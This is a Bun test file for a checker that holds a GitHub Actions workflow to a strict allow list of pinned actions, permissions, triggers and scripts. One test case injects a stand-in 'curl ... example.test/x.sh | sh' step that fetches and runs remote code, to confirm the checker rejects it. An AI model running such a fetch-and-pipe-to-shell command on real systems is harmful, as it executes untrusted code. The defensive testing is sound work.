import { afterEach, expect, test } from 'bun:test';
import { readFile } from 'node:fs/promises';
import { join } from 'node:path';
import { checkWorkflow, runWorkflowCheck, workflowJobs, type WorkflowContext } from '../../../scripts/check-workflow.ts';
import { TIER_NAMES, TIERS } from '../../../scripts/lib/gate.ts';
import { lines, removeWorkspaces, workspace } from './workspace.ts';

// GATE-003 (spec 0010, AC-3, AC-8, AC-9): `check:workflow` applies an allow list to `.github/workflows/application.yml`
// and rejects every key, value, command, action, input, permission, trigger, or path outside it. The fixture is the
// four job workflow of the *Workflow* row, written as YAML at runtime and changed one rule at a time.

const repositoryRoot = join(import.meta.dir, '../../..');

afterEach(removeWorkspaces);

const sha = (digit: string) => digit.repeat(40);
const checkoutUses = `actions/checkout@${sha('1')}`;
const node = { uses: `actions/setup-node@${sha('2')}`, with: { 'node-version': '24.21.0' } };
const bun = { uses: `oven-sh/setup-bun@${sha('3')}`, with: { 'bun-version': '1.4.2' } };
const setup = [
  { run: 'bun install --frozen-lockfile' },
  { run: 'sudo apt-get update && sudo apt-get install -y lsof' },
  { run: 'node node_modules/@playwright/test/cli.js install --with-deps chromium' },
];

function checkout(extra: Record<string, unknown> = {}) {
  return { uses: checkoutUses, with: { 'persist-credentials': false, ...extra } };
}

function upload(name: string, path: string, ifNoFilesFound = 'warn') {
  return {
    uses: `actions/upload-artifact@${sha('4')}`,
    if: 'always()',
    with: { name, path, 'include-hidden-files': true, 'retention-days': 90, 'if-no-files-found': ifNoFilesFound, overwrite: true },
  };
}

function download(name: string, path: string) {
  return { uses: `actions/download-artifact@${sha('5')}`, 'continue-on-error': true, with: { name, path } };
}

type Json = Record<string, any>;

/** The complete workflow of the *Workflow* row, with all three tiers wired. */
function baseline(): Json {
  return {
    name: 'Application foundation',
    on: { push: null, pull_request: null },
    permissions: { contents: 'read' },
    jobs: {
      application: {
        'runs-on': 'ubuntu-24.04',
        'timeout-minutes': 15,
        steps: [checkout(), node, bun, ...setup, { run: 'bun run test:ci' }, upload('application-evidence', '.local/feature-11/evidence/fast/')],
      },
      real: {
        'runs-on': 'ubuntu-24.04',
        'timeout-minutes': 45,
        steps: [checkout(), node, bun, ...setup, { run: 'bun run test:ci:real' }, upload('real-evidence', '.local/feature-11/evidence/real/')],
      },
      security: {
        'runs-on': 'ubuntu-24.04',
        'timeout-minutes': 15,
        steps: [checkout({ 'fetch-depth': 0 }), bun, { run: 'bun run test:ci:security' }, upload('security-evidence', '.local/feature-11/evidence/security/')],
      },
      report: {
        'runs-on': 'ubuntu-24.04',
        'timeout-minutes': 10,
        needs: ['application', 'real', 'security'],
        if: '${{ !cancelled() }}',
        steps: [
          checkout(),
          bun,
          download('application-evidence', '.local/feature-11/evidence/fast/'),
          download('real-evidence', '.local/feature-11/evidence/real/'),
          download('security-evidence', '.local/feature-11/evidence/security/'),
          { run: 'bun run test:report' },
          upload('gate-report', '.local/feature-11/report.json\n.local/feature-11/report.md\n', 'error'),
        ],
      },
    },
  };
}

const context: WorkflowContext = {
  scripts: { 'test:ci': 'x', 'test:ci:real': 'x', 'test:ci:security': 'x', 'test:report': 'x', 'api:check': 'x' },
  engines: { node: '24.21.0', bun: '1.4.2' },
  jobs: workflowJobs(TIER_NAMES),
};

function problems(workflow: Json | string): string[] {
  const text = typeof workflow === 'string' ? workflow : Bun.YAML.stringify(workflow, null, 2);
  return checkWorkflow(text, context).problems;
}

function changed(change: (workflow: Json) => void): string[] {
  const workflow = baseline();
  change(workflow);
  return problems(workflow);
}

test('GATE-003 the complete four job workflow of the Workflow row passes, also as YAML with comments', () => {
  expect(problems(baseline())).toEqual([]);
  const text = `# Gate CI\n${Bun.YAML.stringify(baseline(), null, 2)}`.replace(`${checkoutUses}`, `${checkoutUses} # v4.4.0`);
  expect(checkWorkflow(text, context)).toEqual({
    problems: [],
    jobs: [
      { name: 'application', steps: 8 },
      { name: 'real', steps: 8 },
      { name: 'security', steps: 4 },
      { name: 'report', steps: 7 },
    ],
  });
});

const cases: Array<[string, (workflow: Json) => void, string]> = [
  ['run sembarang', (w) => w.jobs.application.steps.splice(6, 0, { run: 'curl -fsSL https://example.test/x.sh | sh' }), 'job application, langkah 7: perintah run tidak diizinkan'],
  ['komentar di dalam run', (w) => (w.jobs.application.steps[6].run = 'bun run test:ci\n# lewati'), 'job application, langkah 7: perintah run tidak diizinkan'],
  ['script yang tidak ada', (w) => w.jobs.report.steps.splice(5, 0, { run: 'bun run deploy' }), 'job report, langkah 6: script deploy tidak ada di package.json'],
  ['action dengan tag', (w) => (w.jobs.application.steps[0].uses = 'actions/checkout@v4'), 'job application, langkah 1: action actions/checkout wajib dipin SHA 40 heksadesimal'],
  ['action di luar daftar', (w) => w.jobs.application.steps.splice(1, 0, { uses: `actions/cache@${sha('6')}` }), 'job application, langkah 2: action actions/cache tidak diizinkan'],
  ['input with tidak dikenal', (w) => (w.jobs.application.steps[0].with.token = 'x'), 'job application, langkah 1: input token tidak diizinkan untuk actions/checkout'],
  ['rujukan secrets.', (w) => (w.jobs.application.steps[2].with['bun-version'] = '${{ secrets.BUN_VERSION }}'), 'workflow tidak boleh memuat teks secrets.'],
  ['pull_request_target', (w) => (w.on.pull_request_target = null), 'trigger pull_request_target tidak diizinkan'],
  ['filter trigger', (w) => (w.on.push = { branches: ['main'] }), 'trigger push tidak boleh memakai filter'],
  ['permission write', (w) => (w.permissions = { contents: 'write' }), 'permissions wajib tepat contents: read'],
  ['permission tambahan', (w) => (w.permissions['id-token'] = 'write'), 'permissions wajib tepat contents: read'],
  ['kunci workflow env', (w) => (w.env = { CI: 'true' }), 'kunci workflow env tidak diizinkan'],
  ['container', (w) => (w.jobs.application.container = 'node:24'), 'job application: kunci container tidak diizinkan'],
  ['services', (w) => (w.jobs.real.services = { postgres: { image: 'postgres:18' } }), 'job real: kunci services tidak diizinkan'],
  ['env tingkat job', (w) => (w.jobs.real.env = { DATABASE_URL: 'postgres://x' }), 'job real: kunci env tidak diizinkan'],
  ['env tingkat langkah', (w) => (w.jobs.application.steps[6].env = { CI: 'true' }), 'job application, langkah 7: kunci env tidak diizinkan'],
  ['permissions tingkat job', (w) => (w.jobs.application.permissions = { contents: 'read' }), 'job application: kunci permissions tidak diizinkan'],
  ['continue-on-error tingkat job', (w) => (w.jobs.application['continue-on-error'] = true), 'job application: kunci continue-on-error tidak diizinkan'],
  ['strategy', (w) => (w.jobs.application.strategy = { matrix: { os: ['ubuntu-24.04'] } }), 'job application: kunci strategy tidak diizinkan'],
  ['runs-on lain', (w) => (w.jobs.security['runs-on'] = 'ubuntu-latest'), 'job security: runs-on wajib ubuntu-24.04'],
  ['timeout lain', (w) => (w.jobs.real['timeout-minutes'] = 60), 'job real: timeout-minutes wajib 45'],
  ['if tingkat job di luar report', (w) => (w.jobs.application.if = '${{ !cancelled() }}'), 'job application: if hanya diizinkan pada job report'],
  ['if report lain', (w) => (w.jobs.report.if = 'always()'), 'job report: if wajib ${{ !cancelled() }}'],
  ['if pada langkah run', (w) => (w.jobs.application.steps[6].if = 'always()'), 'job application, langkah 7: if hanya diizinkan sebagai always() pada langkah unggah'],
  ['if unggah lain', (w) => (w.jobs.application.steps[7].if = 'success()'), 'job application, langkah 8: if hanya diizinkan sebagai always() pada langkah unggah'],
  ['unggah tanpa if', (w) => delete w.jobs.application.steps[7].if, 'job application, langkah 8: langkah unggah wajib if: always()'],
  ['versi Bun berbeda', (w) => (w.jobs.real.steps[2].with['bun-version'] = '1.4.1'), 'job real, langkah 3: bun-version wajib sama dengan engines.bun'],
  ['versi Node berbeda', (w) => (w.jobs.real.steps[1].with['node-version'] = '24'), 'job real, langkah 2: node-version wajib sama dengan engines.node'],
  ['checkout tanpa persist-credentials: false', (w) => delete w.jobs.report.steps[0].with['persist-credentials'], 'job report, langkah 1: checkout wajib persist-credentials: false'],
  ['job tanpa checkout', (w) => w.jobs.security.steps.shift(), 'job security: wajib memakai actions/checkout'],
  ['security tanpa fetch-depth: 0', (w) => delete w.jobs.security.steps[0].with['fetch-depth'], 'job security, langkah 1: checkout job security wajib fetch-depth: 0'],
  ['fetch-depth di job lain', (w) => (w.jobs.application.steps[0].with['fetch-depth'] = 0), 'job application, langkah 1: fetch-depth hanya diizinkan pada job security'],
  ['unggahan tanpa overwrite: true', (w) => delete w.jobs.real.steps[7].with.overwrite, 'job real, langkah 8: input overwrite wajib pada unggahan'],
  ['overwrite false', (w) => (w.jobs.real.steps[7].with.overwrite = false), 'job real, langkah 8: overwrite wajib true'],
  ['retensi lain', (w) => (w.jobs.real.steps[7].with['retention-days'] = 30), 'job real, langkah 8: retention-days wajib 90'],
  ['tanpa include-hidden-files', (w) => delete w.jobs.real.steps[7].with['include-hidden-files'], 'job real, langkah 8: input include-hidden-files wajib pada unggahan'],
  ['if-no-files-found lain', (w) => (w.jobs.report.steps[6].with['if-no-files-found'] = 'warn'), 'job report, langkah 7: if-no-files-found unggahan gate-report wajib error'],
  ['script tier ganda', (w) => w.jobs.application.steps.push({ run: 'bun run test:ci' }), 'job application: bun run test:ci wajib tepat satu kali, ditemukan 2'],
  ['script tier hilang', (w) => w.jobs.real.steps.splice(6, 1), 'job real: bun run test:ci:real wajib tepat satu kali, ditemukan 0'],
  ['script tier di job lain', (w) => w.jobs.report.steps.splice(5, 0, { run: 'bun run test:ci:security' }), 'job report: script test:ci:security hanya boleh dijalankan job security'],
  ['report tanpa needs', (w) => delete w.jobs.report.needs, 'job report: needs wajib [application, real, security]'],
  ['needs tidak lengkap', (w) => (w.jobs.report.needs = ['application', 'real']), 'job report: needs wajib [application, real, security]'],
  ['needs di job lain', (w) => (w.jobs.real.needs = ['application']), 'job real: needs hanya diizinkan pada job report'],
  ['path unggah salah', (w) => (w.jobs.application.steps[7].with.path = '.local/feature-11/evidence/'), 'job application, langkah 8: path unggahan application-evidence wajib .local/feature-11/evidence/fast/'],
  ['laporan tanpa report.md', (w) => (w.jobs.report.steps[6].with.path = '.local/feature-11/report.json'), 'job report, langkah 7: path unggahan gate-report wajib'],
  ['artifact lain', (w) => (w.jobs.application.steps[7].with.name = 'everything'), 'job application, langkah 8: artifact everything tidak diizinkan diunggah job application'],
  ['path unduh salah', (w) => (w.jobs.report.steps[3].with.path = '.local/'), 'job report, langkah 4: path unduhan real-evidence wajib .local/feature-11/evidence/real/'],
  ['unduh tanpa continue-on-error', (w) => delete w.jobs.report.steps[2]['continue-on-error'], 'job report, langkah 3: langkah unduh wajib continue-on-error: true'],
  ['continue-on-error pada langkah lain', (w) => (w.jobs.report.steps[5]['continue-on-error'] = true), 'job report, langkah 6: continue-on-error: true hanya diizinkan pada langkah unduh job report'],
  ['unduhan hilang', (w) => w.jobs.report.steps.splice(4, 1), 'job report: unduhan security-evidence wajib tepat satu kali, ditemukan 0'],
  ['unduhan di job lain', (w) => w.jobs.real.steps.splice(1, 0, download('application-evidence', '.local/feature-11/evidence/fast/')), 'job real, langkah 2: artifact application-evidence tidak diizinkan diunduh job real'],
  ['job hilang', (w) => delete w.jobs.security, 'job security wajib ada'],
  ['job tambahan', (w) => (w.jobs.deploy = { 'runs-on': 'ubuntu-24.04', steps: [{ run: 'bun run api:check' }] }), 'job deploy tidak diizinkan'],
  ['langkah dengan uses dan run', (w) => (w.jobs.application.steps[6].uses = checkoutUses), 'job application, langkah 7: wajib memakai tepat satu dari uses atau run'],
];

for (const [label, change, expected] of cases) {
  test(`GATE-003 rejects ${label}`, () => {
    const found = changed(change);
    expect(found.some((problem) => problem.startsWith(expected)), `${expected}\n${found.join('\n')}`).toBe(true);
  });
}

test('GATE-003 YAML that cannot be parsed or is not a mapping is rejected', () => {
  expect(problems('jobs: [unclosed\n')).toEqual(['workflow bukan YAML yang valid']);
  expect(problems('- a\n- b\n')).toEqual(['workflow wajib berupa mapping']);
});

test('GATE-003 the workflow in the repository passes with all four jobs of the Workflow row', async () => {
  const jobs = workflowJobs().map((job) => job.name);
  expect(jobs).toEqual(['application', 'real', 'security', 'report']);
  const output = lines();
  expect(await runWorkflowCheck(repositoryRoot, output.log, output.error)).toBe(0);
  expect(output.err).toEqual([]);
  expect(output.out).toHaveLength(1);
  for (const job of jobs) expect(output.out[0]).toContain(`${job} `);
  // Spec 0011 (*Workflow kapasitas*): both workflow files of the folder pass, capacity.yml with its one job.
  expect(output.out[0]).toContain('application.yml (');
  expect(output.out[0]).toContain('capacity.yml (capacity 7 langkah)');
});

test('GATE-003 application.yml and capacity.yml are accepted, and a third workflow file is rejected with its path', async () => {
  // covers: AC-3 (check:workflow), spec 0011 AC-9 (dua file workflow diterima, file ketiga ditolak)
  const copy = async (path: string) => [path, await readFile(join(repositoryRoot, path), 'utf8')] as const;
  const files = Object.fromEntries(
    await Promise.all(['package.json', '.github/workflows/application.yml', '.github/workflows/capacity.yml'].map(copy)),
  );
  const two = await workspace(files);
  const passed = lines();
  expect(await runWorkflowCheck(two, passed.log, passed.error)).toBe(0);
  expect(passed.err).toEqual([]);

  for (const third of ['.github/workflows/deploy.yml', '.github/workflows/nightly.yaml']) {
    const dir = await workspace({ ...files, [third]: 'name: x\non:\n  push:\n' });
    const output = lines();
    expect(await runWorkflowCheck(dir, output.log, output.error), third).toBe(1);
    expect(output.out, third).toEqual([]);
    expect(output.err, third).toEqual([
      'Pemeriksaan workflow gagal dengan 1 masalah:',
      `  file workflow ${third} tidak diizinkan; hanya .github/workflows/application.yml dan .github/workflows/capacity.yml`,
    ]);
  }
});

/** *Dokumen yang diperbarui* (spec 0010, AC-9): the strings each document must hold. */
const documentStrings: Readonly<Record<string, readonly string[]>> = {
  'docs/rules/testing.md': [
    'test:ci:real',
    'test:ci:security',
    'test:report',
    'test:gate',
    'check:test-discovery',
    'check:workflow',
    'check:security',
    '.local/feature-11/',
    'tests/security/',
    'scripts/lib/test-inventory.ts',
    'tests/orchestration/signal-cleanup.ts',
  ],
  'docs/rules/security.md': [
    'tests/security/scanners.json',
    'tests/security/exceptions.json',
    'tests/security/gitleaks.toml',
    'gitleaks',
    'bun audit',
    'actionlint',
  ],
  'docs/rules/infrastructure.md': ['test:ci:real'],
  'README.md': ['test:ci:real', 'test:ci:security', 'test:report'],
  'docs/testing/release-report-template.md': ['report.md', 'security.json'],
};

test('GATE-003 the documents name the tiers, scripts, evidence, scanners, and report, drop the old phrases, and keep the INFRA-001 command', async () => {
  const read = (path: string) => Bun.file(join(repositoryRoot, path)).text();
  for (const [path, strings] of Object.entries(documentStrings)) {
    const text = await read(path);
    for (const value of strings) expect(text.includes(value), `${path} wajib memuat ${value}`).toBe(true);
  }
  expect(await read('docs/rules/testing.md')).not.toContain('berjalan di luar `test:ci` sampai jalur CI dengan Docker tersedia');
  expect(await read('docs/rules/infrastructure.md')).not.toContain('Suite belum termasuk `test:ci`');
  const updateCommand = 'docker compose --env-file .env.infrastructure build --pull --no-cache postgres';
  for (const path of ['README.md', 'docs/rules/infrastructure.md']) expect(await read(path)).toContain(updateCommand);
});

/** Every import specifier reachable from `entry` through relative imports, read with the Bun transpiler. */
async function reachableImports(entry: string): Promise<{ files: string[]; packages: string[] }> {
  const transpiler = new Bun.Transpiler({ loader: 'ts' });
  const files = new Set<string>();
  const packages = new Set<string>();
  const visit = async (path: string) => {
    if (files.has(path)) return;
    files.add(path);
    for (const item of transpiler.scanImports(await Bun.file(path).text())) {
      if (item.path.startsWith('.')) await visit(Bun.resolveSync(item.path, join(path, '..')));
      else packages.add(item.path);
    }
  };
  await visit(join(repositoryRoot, entry));
  return { files: [...files], packages: [...packages].sort() };
}

test('GATE-003 the jobs without bun install run scripts that import only node: modules and relative files', async () => {
  // `security` and `report` set up Bun only (*Workflow* row), so their scripts must not need node_modules.
  for (const entry of ['scripts/gate.ts', 'tests/orchestration/security-scan.ts', 'scripts/gate-report.ts']) {
    const { files, packages } = await reachableImports(entry);
    expect(files.length, entry).toBeGreaterThan(1);
    expect(packages.filter((name) => !name.startsWith('node:')), entry).toEqual([]);
  }
});

// ---------------------------------------------------------------------------------------------------------------
// Added by /test (spec 0010): more keys, triggers, and inputs outside the allow list, and the root scripts of the
// Interface surface table that every workflow step runs.

const moreCases: Array<[string, (workflow: Json) => void, string]> = [
  ['defaults tingkat job', (w) => (w.jobs.real.defaults = { run: { shell: 'bash' } }), 'job real: kunci defaults tidak diizinkan'],
  ['name tingkat job', (w) => (w.jobs.application.name = 'Aplikasi'), 'job application: kunci name tidak diizinkan'],
  ['concurrency workflow', (w) => (w.concurrency = { group: 'x', 'cancel-in-progress': true }), 'kunci workflow concurrency tidak diizinkan'],
  ['defaults workflow', (w) => (w.defaults = { run: { 'working-directory': 'apps' } }), 'kunci workflow defaults tidak diizinkan'],
  ['trigger workflow_dispatch', (w) => (w.on.workflow_dispatch = null), 'trigger workflow_dispatch tidak diizinkan'],
  ['trigger schedule', (w) => (w.on.schedule = [{ cron: '0 0 * * *' }]), 'trigger schedule tidak diizinkan'],
  ['trigger pull_request hilang', (w) => delete w.on.pull_request, 'trigger pull_request wajib ada'],
  ['filter pull_request', (w) => (w.on.pull_request = { paths: ['apps/**'] }), 'trigger pull_request tidak boleh memakai filter'],
  ['working-directory langkah', (w) => (w.jobs.application.steps[6]['working-directory'] = 'apps'), 'job application, langkah 7: kunci working-directory tidak diizinkan'],
  ['shell langkah', (w) => (w.jobs.application.steps[6].shell = 'bash'), 'job application, langkah 7: kunci shell tidak diizinkan'],
  ['timeout-minutes langkah', (w) => (w.jobs.application.steps[6]['timeout-minutes'] = 5), 'job application, langkah 7: kunci timeout-minutes tidak diizinkan'],
  ['cache setup-node', (w) => (w.jobs.application.steps[1].with.cache = 'npm'), 'job application, langkah 2: input cache tidak diizinkan untuk actions/setup-node'],
  ['bun-version-file setup-bun', (w) => (w.jobs.security.steps[1].with['bun-version-file'] = 'package.json'), 'job security, langkah 2: input bun-version-file tidak diizinkan untuk oven-sh/setup-bun'],
  ['unduh dari run lain', (w) => Object.assign(w.jobs.report.steps[2].with, { 'run-id': '1', 'github-token': 'x' }), 'job report, langkah 3: input run-id tidak diizinkan untuk actions/download-artifact'],
  ['unduh dengan pola', (w) => (w.jobs.report.steps[3].with.pattern = '*-evidence'), 'job report, langkah 4: input pattern tidak diizinkan untuk actions/download-artifact'],
  ['input unggah tambahan', (w) => (w.jobs.application.steps[7].with['compression-level'] = 0), 'job application, langkah 8: input compression-level tidak diizinkan untuk actions/upload-artifact'],
  ['secrets. di komentar', (w) => (w.name = 'Application foundation'), 'workflow tidak boleh memuat teks secrets.'],
  ['run dengan uses action lokal', (w) => w.jobs.application.steps.splice(6, 0, { uses: './.github/actions/x' }), 'job application, langkah 7: uses tidak valid'],
  ['action docker', (w) => w.jobs.application.steps.splice(6, 0, { uses: 'docker://alpine:3' }), 'job application, langkah 7: uses tidak valid'],
  ['bun run dengan argumen tambahan', (w) => (w.jobs.application.steps[6].run = 'bun run test:ci --bail'), 'job application, langkah 7: perintah run tidak diizinkan'],
  ['dua perintah dalam satu run', (w) => (w.jobs.application.steps[6].run = 'bun run test:ci && bun run test:report'), 'job application, langkah 7: perintah run tidak diizinkan'],
];

for (const [label, change, expected] of moreCases) {
  test(`GATE-003 rejects ${label}`, () => {
    // covers: AC-3 (Aturan check:workflow)
    const workflow = baseline();
    change(workflow);
    let text = Bun.YAML.stringify(workflow, null, 2);
    // A reference in a comment is still text in the file, so it is rejected too.
    if (label === 'secrets. di komentar') text = `# token: \${{ secrets.GITHUB_TOKEN }}\n${text}`;
    const found = checkWorkflow(text, context).problems;
    expect(found.some((problem) => problem.startsWith(expected)), `${expected}\n${found.join('\n')}`).toBe(true);
  });
}

test('GATE-003 the root scripts run the commands of Interface surface without .env, and every tier step is a root script', async () => {
  // covers: AC-9 (setiap langkah adalah bun run <script> yang dapat dijalankan lokal), AC-4 (Tabel tier)
  const manifest = (await Bun.file(join(repositoryRoot, 'package.json')).json()) as { scripts: Record<string, string> };
  const { scripts } = manifest;
  expect({
    'test:ci': scripts['test:ci'],
    'test:ci:real': scripts['test:ci:real'],
    'test:ci:security': scripts['test:ci:security'],
    'test:report': scripts['test:report'],
    'test:ci:capacity': scripts['test:ci:capacity'],
    'test:report:capacity': scripts['test:report:capacity'],
    'test:scenarios': scripts['test:scenarios'],
    'check:test-discovery': scripts['check:test-discovery'],
    'check:workflow': scripts['check:workflow'],
    'check:security': scripts['check:security'],
    'test:gate': scripts['test:gate'],
    'test:performance:plan': scripts['test:performance:plan'],
    'test:performance:smoke': scripts['test:performance:smoke'],
    'test:performance:load': scripts['test:performance:load'],
    'test:performance:stress': scripts['test:performance:stress'],
    'test:performance:spike': scripts['test:performance:spike'],
    'test:performance:outage': scripts['test:performance:outage'],
    'test:performance:soak': scripts['test:performance:soak'],
  }).toEqual({
    'test:ci': 'bun --no-env-file scripts/gate.ts fast',
    'test:ci:real': 'bun --no-env-file scripts/gate.ts real',
    'test:ci:security': 'bun --no-env-file scripts/gate.ts security',
    'test:report': 'bun --no-env-file scripts/gate-report.ts',
    // Spec 0011 (*Configuration required*): the manual capacity tier and its report.
    'test:ci:capacity': 'bun --no-env-file scripts/gate.ts capacity',
    'test:report:capacity': 'bun --no-env-file scripts/gate-report.ts capacity',
    'test:scenarios': 'bun --no-env-file scripts/validate-scenarios.ts',
    'check:test-discovery': 'bun --no-env-file scripts/check-test-discovery.ts',
    'check:workflow': 'bun --no-env-file scripts/check-workflow.ts',
    'check:security': 'bun --no-env-file tests/orchestration/security-scan.ts',
    'test:gate': 'mkdir -p .local/feature-11 && bun --no-env-file test ./tests/integration/gate --reporter=junit --reporter-outfile=.local/feature-11/gate.xml',
    // Spec 0011 (*Interface surface*): the k6 plan units and the smoke profile.
    'test:performance:plan': 'mkdir -p .local/feature-12 && bun --no-env-file test ./tests/integration/performance --reporter=junit --reporter-outfile=.local/feature-12/plan.xml',
    'test:performance:smoke': 'bun --no-env-file tests/orchestration/performance-real.ts smoke',
    // Spec 0011 (*Configuration required*): one root script per capacity profile.
    'test:performance:load': 'bun --no-env-file tests/orchestration/performance-real.ts load',
    'test:performance:stress': 'bun --no-env-file tests/orchestration/performance-real.ts stress',
    'test:performance:spike': 'bun --no-env-file tests/orchestration/performance-real.ts spike',
    'test:performance:outage': 'bun --no-env-file tests/orchestration/performance-real.ts outage',
    'test:performance:soak': 'bun --no-env-file tests/orchestration/performance-real.ts soak',
  });
  for (const name of TIER_NAMES) {
    for (const step of TIERS[name]!.steps) expect(Object.hasOwn(scripts, step.script), `${name} ${step.script}`).toBe(true);
  }
  // Every job runs one root script that exists, so the same command runs locally.
  for (const job of workflowJobs()) expect(Object.hasOwn(scripts, job.script), job.name).toBe(true);
});
